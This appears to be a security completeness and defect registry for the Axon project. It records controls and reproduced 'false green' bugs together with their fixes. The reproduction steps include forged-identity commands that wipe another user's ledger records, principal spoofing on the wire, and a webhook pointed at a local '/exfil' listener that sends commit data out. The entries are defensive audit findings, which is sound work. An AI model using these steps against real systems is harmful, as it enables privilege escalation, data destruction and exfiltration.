purpose: Machine-readable completeness state. AXON-COMPLETENESS.md is GENERATED from this file by scripts/completeness.py; edit this, never the markdown. Every claim of proof must cite evidence that exists on disk, and the generator fails if it does not — the point is to stop 'how close is Axon?' being an intuition question, which a hand-maintained table would not.

legend.production_proof: yes = the PRODUCTION path is proven to use it (not just that it exists and has tests) | no | unknown
legend.mutation: yes = a load-bearing assertion was mutation-verified | partial | no | unknown
legend.engines: For SECURITY-SENSITIVE semantics only. Per-engine enforcement: enforced | not-enforced | refused (the engine refuses rather than pretending) | n/a | unknown. Added because a single row reading 'effect ceiling: implemented' is how one implementation gets mistaken for system-wide support — which is exactly the D-002 defect: the interpreter enforced the ambient ceiling and a natively built binary ignored it, proven by execution. The generator REFUSES a row whose engines disagree (one enforced, another not-enforced) unless its implementation is marked partial or absent.
legend.controls: Per-engine support for a runtime/security CONTROL, as a closed state set: enforced | explicitly-refused | not-applicable | unknown | silently-ignored. `silently-ignored` is the defect state and is nameable on purpose — a control an engine neither honours nor refuses is the shape that produced every divergence found so far. A control may not be `status: resolved` while any engine is `unknown` or `silently-ignored`. Lives here rather than in a new file because this repository already carries four governance registries and D-007 records that as a problem, not a pattern to extend.
legend.wasm_cell_rule: The `wasm` cell summarises FOUR artifacts that do not agree: the wasip1 INTERPRETER bundle (axon-run.wasm), the wasip1 AOT artifact (<prog>.linked.wasm), and the two wasm32-unknown-unknown browser forms. Rule, chosen to fail closed: if ANY artifact silently-ignores a control the cell reads `silently-ignored`; a cell may never claim better than its worst artifact. wasm32-unknown-unknown has NO process environment — std::env::var returns NotPresent unconditionally and a getenv reference is a hard link error, since the only symbol allowed to stay undefined is axon_host_write — so every env-keyed control there is `not-applicable`, not `unknown`.
legend.false_greens: A FALSE GREEN is a check, test, or matrix cell that REPORTED SUCCESS while the thing it claims to verify was not verified. It is strictly worse than an `unknown`: an unknown advertises itself and invites work, whereas a false green actively discourages the work and is believed. Every entry here was REPRODUCED, not suspected. The doctrine they all violate: **success must carry evidence; failure may never synthesize success.** Driving this count to zero is a harder and more valuable release criterion than driving the unknown count to zero, and the two must never be traded against each other — relabelling an unknown as enforced to improve a number MANUFACTURES a false green.

controls.name: reflex.principal-isolation
controls.note: CX-35 Phase 1. A decision is made under exactly one principal and no StateHandle is reachable across principals; cross-principal reuse is a REFUSAL, never a cache miss. Enforced identically in all three deployment modes, each with its OWN test — the combined version aborted at the first mode, leaving sidecar and remote unproven while appearing to cover them. Mutation-verified twice, per mode: removing the authority check fails all three, and collapsing the refusal into a cache miss fails all three. AXIS=MODE: this says nothing about whether any EXECUTION engine supports the control. || The single shared authority core survived every attack; the failures are all in the transport and reporting layers around it.
controls.open: DEMOTED after adversarial review — the previous `enforced` in all three modes overstated what the code delivers, and this row misleading readers outside the crate is the expensive kind of defect. REPRODUCED: (a) the principal on the wire is an UNAUTHENTICATED caller-asserted string, so mallory obtains alice's decision by typing "principal":"alice"; (b) duplicate `principal` keys are accepted last-wins — the exact attack axon-cortex's parse_strict was written to stop; (c) frames carry no request correlation, so an HONEST backend's refusal is delivered to the client as Ok; (d) RemoteService ignores the HTTP status, so a 500 becomes a decision. Embedded stays `enforced`: it has no wire and reaches the shared authority core directly.

controls.name: axon-signal.http-caller-identity
controls.open: The dashboard's RBAC filter calls resolve_caller(None), which reads the SERVER's AXON_PRINCIPAL — not the request's. Every HTTP caller therefore sees the OPERATOR's view. Filtering reads is not authenticating an endpoint, and this endpoint has no caller identity to authenticate. Network exposure is closed (loopback, no wildcard CORS); per-caller authorization is NOT.

controls.name: guest.policy-delivery-default-backend
controls.open: axon-guest-init is compiled into the guest image ONLY for AXON_KERNEL_BACKEND=linux. The DEFAULT backend (axon-guest-kernel) writes a stub /init that execs `axon run` directly and never invokes guest-init at all, delivering policy by kernel cmdline (axon.policy=<base64>) and enforcing it in-kernel instead. So FG-023 hardens the non-default path only. The kernel parser appears to fail closed on every failure mode it handles (set_closed_policy, EffectSet(0) default), but whether a syntactically-valid-but-EMPTY axon.policy={} reaches the same conclusion is UNTRACED — the analogous defect in the analogous parser.

controls.name: AXON_LEDGER_DEV_IMPERSONATE
controls.note: Read by the axon-ledger CLI only, not by any Axon execution engine — hence not-applicable across all four engine columns rather than unknown. It is the explicit development-only escape that lets a CLAIMED identity (--as / AXON_PRINCIPAL) carry admin authority again; without it authority comes from the real uid via rbac.json authenticated_admins. Must be exactly `1`; `0`, `true`, `yes`, empty and `1 ` are all tested disarmed, so production is the default state.

false_greens.fix: Added IoKind::DurableStore (not FsRead/FsWrite: the argument is a store key, so `fs: [read("k")]` would name one thing and permit a write to stores/k.ndjson) with an honest E1001; classified in builtin_effect_row and is_impure_builtin; the runtime scope check now asks the scope about the REAL store directory, which is knowable at run time though not at check time; the journal bypass stays exempt (it needs `file_remove` on AxonHost, a TCB decision reserved for a person, R42 Section 9 Q3) but is no longer SILENT — refused under AXON_REPLAY, warned once under AXON_RECORD. Guard: tests/builtin_impl_matches_classification.rs derives the premise from the INTERPRETER SOURCE rather than a table, requiring any builtin whose match arm reaches std::fs/std::process/stdin to be classified; verified to fail, naming all three, when the classification is removed. 5 regression tests, 3 mutations caught.

false_greens.claimed: `check_builtin_value_ref` closes the builtin-aliasing laundering route (THREAT_MODEL Section 8): a capability-bearing builtin used as a VALUE has no call site to path-check, so it is refused unless the whole capability is granted. `axon check` reported clean.
false_greens.reality: It asked `capability_of_builtin`, which yields ONE kind per call and has no arm for file_copy/file_rename, so it returned early for both; and its match on the capability LABEL ended in `_ => false`, silently permitting every label it did not name — including `env_var`, whose DIRECT call is an unconditional E1001 because the environment is an ungrantable ambient secret channel, and the durable store.
false_greens.reproduced: Inside @[contained(fs: [], net: [], exec: none)]: `let f = write_file` -> E1001 exit 2 (correct), while `let f = file_copy`, `let f = file_rename`, `let f = env_var` and `let f = dstore_open` all passed with exit 0. The env_var case fully reverses a containment fix whose direct-call path is E1001.
false_greens.fix: The guard now reads the per-argument table (so a multi-kind builtin needs EVERY kind granted) and matches on IoKind exhaustively, so a new kind must be decided about rather than defaulting to allowed. Ungrantable kinds (Env, DurableStore) are always refused, matching their direct call sites. Separately, `audit_effect_kind` now resolves file_copy/file_rename to FS instead of the coarse IO of their effect row, so a reviewer filtering the ledger for filesystem activity sees the one builtin that reads one path and writes another. 4 regression tests incl. a half-grant control (a read-only grant must still refuse an aliased copy, naming the missing fs:write); 3 mutations caught.

false_greens.claimed: RBAC restricts a member to their own records; FG-025 closed the read paths and the store API was then guarded against a filtered handle performing a whole-ledger rewrite.
false_greens.reality: No maintenance verb consulted rbac at all. `rbac` appeared at exactly two lines in the entire CLI, both inside `search`. The reads were filtered; nothing asked who the caller WAS before letting them rewrite the file. My own FG-027 follow-up guarded the store API against a FILTERED handle and its control asserted 'an unfiltered handle must still be able to prune' — correct for the API, and exactly the wrong place to stop asking.
false_greens.reproduced: Two-principal ledger, admins=[alice]; bob a member whose `stats` showed 1 of 2. `prune --older-than 2099-01-01 --yes` -> exit 0, 'Pruned 2; 0 remain', alice's records destroyed. `engineer-backfill --email bob@example.com` -> exit 0, '2/2 records -> bob'; `stats` then showed 2 and `diff --json` returned alice's payload verbatim. Privilege escalation, not only destruction. `prune --dry-run` additionally disclosed whole-ledger aggregates (an 11th read path the 'all ten reads' enumeration missed).
false_greens.fix: One `requires_admin(&Commands)` consulted once before dispatch, EXHAUSTIVE over the command enum with no `_` arm, so a new command does not compile until someone classifies it. Reads stay open and filtered (gating them would hide a filter regression behind a refusal); appending verbs are classified not-privileged with the reason stated, since whether an arbitrary caller may append is a separate question. RBAC stays inert with no admins configured, pinned by a test. Also closes the untested `replace_record` guard. 3 mutations caught. Found by an adversarial review of the two commits that preceded it.

false_greens.claimed: FG-027 fixed the multi-kind blind spot: `file_copy`/`file_rename` are classified by the per-argument table, and the value-ref guard and the R28 audit ledger both see them.
false_greens.reality: It fixed two consumers of `capability_of_builtin` and left three. `pre_effect_gate` (the @[agent] action log), `collect_caps_expr` (hence `program_capabilities`, hence the E1203 import gate, the module audit verdict and R10's G2 monotonicity gate), and `cap_to_effect_row` all still asked the single-kind function. `cap_to_effect_row` additionally matched the label "fs", which `cap_label` never produces.
false_greens.reproduced: (a) An @[agent] fn that read, copied and renamed a file produced ONE agent_action row (the read) while moved.txt existed on disk — in the log R4 4.3 calls un-opt-out-able. (b) An imported module calling `write_file` is E1203 against a contained importer; the same module calling `file_copy` — strictly MORE authority — passed exit 0, with a dstore control proving the gate itself works. (c) That single row read `caps_used:"fs:read"` beside `effect_row:"Other"`.
false_greens.fix: All three now use the per-argument table (`capability_of_builtin_multi` / `classify_call_paths`), and `cap_to_effect_row` matches the labels `cap_label` actually emits. The codegen counterpart (codegen/asi.rs) was fixed the same way but was NOT a live hole: native refuses file_copy/file_rename with E0910, verified. 3 regression tests, 3 mutations caught. Severity note on FG-027: builtin-as-value is not executable in the interpreter (an aliased call panics 'undefined identifier', exit 101), so that guard is static-only and nothing was exfiltrable through it.

false_greens.claimed: The capability-catalog lockstep test ensures a builtin that reaches the world is classified by the @[contained] gate.
false_greens.reality: It fired only on Net/Exec rows — `IO` was deliberately excluded as 'the coarse row' — so a builtin missing from BOTH tables was invisible to it AND to its reverse. That is exactly how dstore_open/apply/clear shipped as pure. Widening it to IO/FS also revealed that the guard asked `capability_of_builtin`, reproducing inside itself the single-kind blind spot it exists to catch: it flagged file_copy/file_rename, which ARE classified.
false_greens.reproduced: Removing the dstore classification leaves the Net/Exec-only guard GREEN; the widened guard fails naming all three. Adding the IO direction while still asking the single-kind resolver falsely flags file_copy and file_rename.
false_greens.fix: Widened to IO/FS with an EXEMPT_IO list where every entry carries a reason, and both directions now ask `capability_of_builtin_multi`. A stale-exemption assertion fails if a listed name later becomes classified. KNOWN GAP recorded rather than closed, WIDER than first documented here: the entry originally named only the `goal_*` family, but a disproof review found the real vector is the `@[adaptive]` return-logging path inside `call_fn` itself, reached by ANY `@[adaptive]` call — `goal_run` is one caller of it, not the boundary. Measured: an `@[agent]` fn calling an `@[adaptive]` fn DIRECTLY (no goal_run) produces 0 `agent_action` audit rows and 2 program-derived `adaptive_return` lines on disk, and the same write happens at exit 0 under `AXON_ALLOWED_EFFECTS=Pure` — that ceiling gates BUILTIN calls via the F5 hook, and this write is not a builtin call, so it sits outside that hook entirely. SUPERSEDED — now FIXED, see FG-032: the write is suppressed when the effect ceiling grants no IO, so the capability is no longer obtainable. The original reasoning for exempting it was that the path comes from the environment and never from program input, and gating `@[adaptive]`/`goal_run` would refuse every contained optimiser — a policy change, not a bug fix. The fixed-path property is pinned by `the_provenance_path_is_not_program_addressable`, extended to cover the direct `@[adaptive]` path as well as `goal_run`, so the exemption's justification fails loudly if it stops holding. Residual risk: a low-bandwidth covert channel into the same user's cache.

false_greens.claimed: The ledger's admin gate restricts prune/engineer-backfill/session-refresh/refresh/rbac to an admin, and refused non-admins with 'restricted to an admin'.
false_greens.reality: It compared rbac.admins against the caller's OWN assertion — `--as <email>` or $AXON_PRINCIPAL, both set by the caller with no verification of any kind. The gate refused a caller who had not claimed to be someone else and admitted anyone who had, which looks like authorization and is not. The previous pass recorded this as an accepted boundary and pinned the vulnerable behavior in a passing test.
false_greens.reproduced: Two-principal ledger, admins=[alice@example.com]: `--as alice@example.com prune --older-than 2099-01-01 --yes` run by an arbitrary caller -> exit 0, 'Pruned 2; 0 remain', events.ndjson emptied. Same claim via $AXON_PRINCIPAL -> identical result.
false_greens.fix: Identity split into CLAIMED (--as/$AXON_PRINCIPAL, steers read filtering, confers nothing) and AUTHORITY (Authority::resolve, built from the real uid via getuid()). is_admin_authenticated takes an AuthenticatedPrincipal that only that constructor can produce, so a flag-derived &str cannot reach the privileged check. Admin authority comes from a new, explicitly separate rbac.json field `authenticated_admins` holding OS identities — separate rather than an email local-part heuristic over `admins`, since matching OS user `alice` against `alice@some-corp.example` would silently grant authority to whoever holds that local account. $USER/$LOGNAME deliberately not consulted (caller-settable, so exactly as forgeable as the flag). Dev impersonation survives behind AXON_LEDGER_DEV_IMPERSONATE=1, which must be exactly '1' ('0','true','yes','','1 ' all tested disarmed). 4 mutations caught, after fixing a test premise where the forged-$USER fixture left authenticated_admins empty so the refusal came from 'nobody is an admin' rather than from the forgery failing. BOUNDARY, executable: a test performs the same destructive outcome with plain std::fs and no CLI, because RBAC governs the CLI and the filesystem governs the file. INCOMPLETE AS FIRST LANDED — see FG-034/FG-035: the write verbs were moved to authenticated identity and the READ bypass was not, and a bootstrap window added alongside it let any caller self-grant. Both closed in 7a56aab.

false_greens.claimed: The effect ceiling (@[contained], scoped sandbox, AXON_ALLOWED_EFFECTS) governs a program's durable writes; FG-030 recorded the provenance write as an accepted exemption because its path is fixed and not program-addressable.
false_greens.reality: A fixed path still yields a durable write with program-chosen CONTENT and unbounded VOLUME. The @[adaptive] return-logging append is not a builtin call, so it never reached pre_effect_gate where the ceiling is enforced, and goal_run amplifies it — max_evals <= 0 means unlimited, so a contained function could drive an unbounded number of rows whose score, input and payload it chooses. That is a general durable store reached through the audit machinery.
false_greens.reproduced: Each exit 0 with a row on disk: a direct @[adaptive] call inside @[contained(fs: [], net: [], exec: none)]; the same under AXON_ALLOWED_EFFECTS=Pure; and inside sandbox_run(sandbox_create(p, ""), ...), whose ceiling is deny-all.
false_greens.fix: The write site now asks the ceiling the same question pre_effect_gate asks, through ONE shared predicate (first_effect_outside_ceiling), and SUPPRESSES the write rather than refusing the call. Refusal would abort every contained optimiser; suppression does not, because the in-memory best store goal_run reads is untouched — pinned by a companion test asserting the optimiser still returns the right best score, without which 'suppress' could not be told from 'break'. All reachability paths are covered because the check sits at the single site every path funnels through (direct, nested, contained, goal_run, sandbox_run); aliasing is not a vector since Axon has no first-class user-fn values. 4 mutations, 3 caught; the 4th is unreachable-by-construction dead defensive code and is documented as such rather than given a contrived fixture. INCOMPLETE AS FIRST LANDED — see FG-036: only the @[adaptive] writer was guarded; append_agent_action_jsonl and append_ai_call_jsonl wrote to the same file unguarded.

false_greens.claimed: Ledger records identify their principal, and the previous pass recorded caller-chosen attribution on append as a deliberate, documented scope decision.
false_greens.reality: The record had exactly one identity field and it was the SUBJECT, fully caller-chosen, with nothing recording the ACTOR. A non-admin could write records attributed to another principal, and those records then landed inside the victim's RBAC view and nobody else's. The MCP ledger_refresh tool authenticates no identity at all.
false_greens.reproduced: `--as bob@example.com ingest session s1.jsonl --engineer alice@example.com` -> exit 0, record with principal alice@example.com. MCP tools/call ledger_refresh {engineer: carol@...} -> same, unauthenticated. A repo with a forged git author -> principal git:alice@example.com. Then `--as alice stats` showed them and `--as bob stats` showed none.
false_greens.fix: The subject is NOT restricted — --engineer exists so a CI account can ingest many engineers' sessions, and gating it would break the normal ingest path rather than secure it. Instead the axes are separated: `principal` stays the subject, and a new `recorded_by` carries the ACTOR, stamped by Store::append from the OS-authenticated identity and OVERWRITING anything the caller supplies. Store::append is the choke point every new record in the workspace is born through (CLI ingest, MCP, watcher, axon-signal), so all surfaces are covered at once; the MCP path, which authenticates nothing, is tested explicitly. Option + serde default + skip_serializing_if like the existing `repo` field, and no digest covers the struct (the record id hashes principal|effect|ts_ms|payload only), so existing records still load — a test. 3 mutations caught. INCOMPLETE AS FIRST LANDED — see FG-037: Store::append was stamped and replace_record was not, so session-refresh ERASED the writer.

false_greens.claimed: Privileged ledger operations require an authenticated admin; the CLI gate refused non-admins for prune/refresh/engineer-backfill/session-refresh/rbac.
false_greens.reality: The gate lived in main() before CLI dispatch. The MCP server dispatches tool calls internally and never consulted it, so the same operation reached over stdio JSON-RPC skipped authorization entirely. The previous pass had classified Commands::Mcp as 'appends new records; does not rewrite or reattribute' — classifying the SERVER rather than the operations it exposes.
false_greens.reproduced: With authenticated_admins=[nobody-real]: CLI `refresh --repo R` refused, ledger unchanged at 2 records; `tools/call ledger_refresh {repo: R}` returned ok and wrote 193 records, including one whose principal was a git author the caller chose.
false_greens.fix: Privileged MCP tools now resolve the same Authority and are refused identically, with an exhaustive tool classification that fails closed on an unknown tool name. MCP carries no caller identity, so the authority checked is the SERVER process's OS identity — a client of an admin-run server inherits it, which is stated at the check rather than implied. Mutation-tested; read tools verified still ungated.

false_greens.claimed: A caller-supplied identity string does not grant admin authority (FG-031).
false_greens.reality: Only the WRITE verbs were moved to authenticated identity. filter_owned/filter_visible still compared rbac.admins against the --as string, so a claimed admin got the full-visibility bypass. Separately, RBAC read as OFF whenever `admins` was empty — including the exact configuration the refusal message instructs operators to write (authenticated_admins only), which showed every caller everything. And the bootstrap window added with FG-031 let ANY caller self-grant permanent admin on any ledger with an empty authenticated_admins, which is every pre-existing ledger.
false_greens.reproduced: `--as alice@example.com stats` reported 2 records to a caller entitled to 1; same via $AXON_PRINCIPAL and the MCP ledger_stats tool. A ledger with only authenticated_admins set showed a member all records. `rbac grant --authenticated <self>` succeeded for a non-admin on an upgraded ledger.
false_greens.fix: The read bypass consumes Authority, derived inside Store::open_as so every call site is covered without a signature change. One gate_is_armed() answers 'is RBAC on' for both lists everywhere. The bootstrap window is removed: authority may be established only while the gate is FULLY inert, and granting visibility first is refused because it would arm the gate with no administrator — a permanent lockout an unprivileged caller could trigger. Mutation-tested; filter_visible's own bypass is documented as unreachable (its one caller reads an already-filtered handle).

false_greens.claimed: A program cannot obtain a durable write by reaching the provenance machinery (FG-032).
false_greens.reality: Only the @[adaptive] writer was guarded. append_agent_action_jsonl — emitted at the TOP of pre_effect_gate, before the ceiling is consulted — and append_ai_call_jsonl wrote to the same provenance.jsonl unguarded.
false_greens.reproduced: Under AXON_ALLOWED_EFFECTS=Net,AI (IO denied, write_file refused), an @[agent] fn looping 8 times over ai_complete produced 8 agent_action + 8 ai_call rows: 16 durable program-derived lines with an attacker-chosen function name and a SHA-256 of an attacker-chosen prompt. Loop count arbitrary, so volume unbounded.
false_greens.fix: Both writers now honour the same predicate. Stated cost: a run denied filesystem effects leaves NO provenance audit trail, because persisting one IS the capability it was denied. Only run_start remains — one row per process, written before the program executes, no program-chosen content, and the replay handle. Test asserts nothing but run_start survives a denied ceiling, with a premise check that both writers fire when IO is granted.

false_greens.claimed: Every ledger record carries an unforgeable authenticated writer (FG-033).
false_greens.reality: Store::append is the choke point for a record being BORN, not for its bytes changing. replace_record wrote the caller's struct verbatim, and ingest_session returns an UNSTAMPED original while appending a stamped clone — so session-refresh erased recorded_by entirely (the field is skip_serializing_if), leaving a record indistinguishable from a pre-attribution one.
false_greens.reproduced: A record with recorded_by=ci-bot, refreshed via `session-refresh`, came back with the field absent.
false_greens.fix: The rule is now uniform: a method that changes a record's BYTES stamps the writer. replace_record and rewrite_principals stamp; prune is the stated exception because it copies survivors verbatim. Mutation found this fixed-but-untested and a regression test was added.

false_greens.claimed: `requires_admin` is EXHAUSTIVE over the command enum with no `_` arm, so a new command does not compile until someone decides whether it is privileged.
false_greens.reality: Exhaustiveness guarantees a decision is MADE for every command; it cannot catch one decided WRONGLY. `Commands::Webhook` sat in the group commented 'appends NEW records; does not rewrite or reattribute' — but `webhook add`/`rm` append nothing. They write webhooks.json, durable egress configuration that later drives an outbound POST from the ledger host when `pre-deploy` fires.
false_greens.reproduced: RBAC armed (admins=[alice], authenticated_admins=[nobody-real]), caller not an admin: `webhook add --event unexplained-deploy --provider generic --url http://127.0.0.1:9977/exfil` -> exit 0, webhooks.json written; `pre-deploy` then POSTed commit authors, messages and SHAs to that listener; `webhook rm wh_00000001` removed a legitimate admin's hook. Exfiltration, arbitrary-URL SSRF from the ledger host, and silencing another principal's alerting — none of it requiring the dev escape.
false_greens.fix: `webhook add`/`rm` classified privileged, `webhook list` left open as a read (same reasoning as `rbac list`). Regression test names both directions plus the admin control; the destructive-verb sweep gained webhook rows. Mutation-tested by reclassifying it back to non-privileged. Found by an adversarial review AFTER the exhaustive-match change had been described as making a missed classification impossible — the correction to that claim is recorded in the code comment at the arm.

false_greens.claimed: scripts/release_check.sh step 3 ("A STRICT GATE RECEIPT BOUND TO THIS COMMIT") reports "ok strict gate receipt" only when a strict-mode gate.sh run certifies the commit, per governance/RELEASE.md Section 6.
false_greens.reality: The matching logic was a substring regex, grep -qE '^command=.*gate\.sh', which a PLAIN non-strict scripts/gate.sh invocation also matches. --strict is what runs parity_all.sh (~22 interp/codegen/AOT-wasm harnesses), --all-targets clippy, and the smt feature; gate.sh's own GATE-03 comment states a non-strict run "proves NOTHING about invariant I-2" while still printing gate PASSED. A legitimately green non-strict run would be reported as ok strict gate receipt and could certify RELEASE-VERIFIED. Found by an adversarial review whose sole task was to disprove the release-verification machinery itself, immediately after that machinery was built.
false_greens.reproduced: printf 'command=%s\n' "scripts/gate.sh" | grep -qE '^command=.*gate\.sh' matches. Verified end to end with synthetic receipts built in scratch (not the real .axon-runs dir): the old check accepted both a non-strict and a strict receipt as strict gate evidence.
false_greens.fix: Fixed at the source rather than by tightening the regex — a free-text command match is fragile (a proposed tighter regex would still miss --strict=1 or reordered flags). write_receipt now derives explicit gate_run/gate_strict fields the same way gate.sh parses its own argv: gate_strict requires an exact --strict TOKEN; gate_run requires gate.sh as the FIRST token of the command, not merely present anywhere — closing a second gap found while fixing the first (echo scripts/gate.sh --strict would otherwise set both fields true with no gate run at all). release_check.sh now reads only those two fields. Re-verified against the same synthetic receipts: new logic rejects the non-strict one, accepts the strict one.
